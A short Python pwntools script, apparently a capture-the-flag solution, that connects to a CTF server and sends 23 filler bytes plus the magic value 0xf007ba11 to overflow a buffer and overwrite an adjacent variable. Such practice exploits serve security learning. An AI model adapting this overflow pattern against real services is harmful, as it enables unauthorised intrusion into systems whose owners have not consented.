from pwn import *


secret = p32(0xf007ba11)

r = remote("pwn.ctf.tamu.edu",4321)

r.recv(1024)

payload = "A" * 23 + secret

r.sendline(payload)

print r.recv()


